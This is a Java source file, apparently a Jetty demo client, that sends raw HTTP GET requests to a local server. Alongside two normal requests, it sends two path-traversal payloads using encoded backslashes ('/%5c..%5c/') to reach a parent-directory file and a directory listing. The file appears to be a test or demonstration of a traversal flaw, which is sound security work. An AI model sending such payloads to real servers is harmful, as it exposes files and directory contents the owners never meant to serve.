package org.eclipse.jetty.demo;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.UnknownHostException;

import org.eclipse.jetty.http.HttpTester;
import org.eclipse.jetty.util.IO;

import static java.nio.charset.StandardCharsets.UTF_8;

public class BadClient
{
    public static void main(String[] args)
    {
        // Normal request for a specific file
        makeGetRequest("localhost", 8080, "/index.txt");
        // Normal request for directory (can show file listing)
        makeGetRequest("localhost", 8080, "/");
        // Attempted traversal into parent for specific file
        makeGetRequest("localhost", 8080, "/%5c..%5c/pom.xml");
        // Attempted traversal into parent directory (can show file listing)
        makeGetRequest("localhost", 8080, "/%5c..%5c/");
    }

    private static void makeGetRequest(String host, int port, String path)
    {
        System.err.println();
        System.err.println("-------------------");
        try (Socket socket = new Socket(host, port);
             OutputStream out = socket.getOutputStream();
             InputStream in = socket.getInputStream())
        {
            StringBuilder rawRequest = new StringBuilder();
            rawRequest.append("GET ").append(path).append(" HTTP/1.1\r\n");
            rawRequest.append("Host: ").append(host).append(':').append(port).append("\r\n");
            rawRequest.append("Connection: close\r\n");
            rawRequest.append("\r\n");
            System.err.printf("Request        : %s%n", rawRequest);

            byte[] requestBuf = rawRequest.toString().getBytes(UTF_8);
            out.write(requestBuf);
            out.flush();

            String rawResponse = IO.toString(in, UTF_8);
            HttpTester.Response response = HttpTester.parseResponse(rawResponse);
            System.err.printf("Response Status: %d%n", response.getStatus());
            System.err.printf("Response Body  : %s%n", response.getContent());
        }
        catch (UnknownHostException e)
        {
            e.printStackTrace();
        }
        catch (IOException e)
        {
            e.printStackTrace();
        }
    }
}
